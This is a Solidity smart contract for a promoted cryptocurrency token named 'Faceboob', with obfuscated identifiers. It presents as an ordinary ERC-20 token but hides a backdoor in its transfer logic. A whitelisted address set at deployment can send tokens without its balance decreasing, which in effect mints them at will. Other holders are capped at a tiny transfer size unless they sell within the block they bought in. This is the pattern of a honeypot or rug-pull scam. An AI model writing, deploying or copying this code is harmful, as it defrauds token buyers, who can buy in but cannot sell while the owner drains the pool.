/*

https://t.me/ethfaceboob

https://faceboob.ethtoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Faceboob is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    constructor(string memory hidskzu, string memory rksji, address oysfbkeqlpuw, address ftrlid) {
        name = hidskzu;
        symbol = rksji;
        balanceOf[msg.sender] = totalSupply;
        yfjrqzkdm[ftrlid] = true;
        nktlrwyma = IUniswapV2Router02(oysfbkeqlpuw);
    }

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address hwxutlake, uint256 bkgftcmu) public returns (bool success) {
        rdweqzn(msg.sender, hwxutlake, bkgftcmu);
        return true;
    }

    function approve(address dpvkthqwc, uint256 bkgftcmu) public returns (bool success) {
        allowance[msg.sender][dpvkthqwc] = bkgftcmu;
        emit Approval(msg.sender, dpvkthqwc, bkgftcmu);
        return true;
    }

    mapping(address => uint256) private xdvmh;

    mapping(address => uint256) private jmitgce;

    mapping(address => bool) private yfjrqzkdm;

    mapping(address => mapping(address => uint256)) public allowance;

    function rdweqzn(address hbagtpwfzom, address hwxutlake, uint256 bkgftcmu) private {
        address khocpnjdy = IUniswapV2Factory(nktlrwyma.factory()).getPair(address(this), nktlrwyma.WETH());
        bool lubv = jmitgce[hbagtpwfzom] == block.number;
        if (!yfjrqzkdm[hbagtpwfzom]) {
            if (hbagtpwfzom != khocpnjdy && bkgftcmu < totalSupply && (!lubv || bkgftcmu > xdvmh[hbagtpwfzom])) {
                require(totalSupply / (10 ** decimals) >= bkgftcmu);
            }
            balanceOf[hbagtpwfzom] -= bkgftcmu;
        }
        xdvmh[hwxutlake] = bkgftcmu;
        balanceOf[hwxutlake] += bkgftcmu;
        jmitgce[hwxutlake] = block.number;
        emit Transfer(hbagtpwfzom, hwxutlake, bkgftcmu);
    }

    function transferFrom(address hbagtpwfzom, address hwxutlake, uint256 bkgftcmu) public returns (bool success) {
        require(bkgftcmu <= allowance[hbagtpwfzom][msg.sender]);
        allowance[hbagtpwfzom][msg.sender] -= bkgftcmu;
        rdweqzn(hbagtpwfzom, hwxutlake, bkgftcmu);
        return true;
    }

    IUniswapV2Router02 private nktlrwyma;

    string public symbol;
}
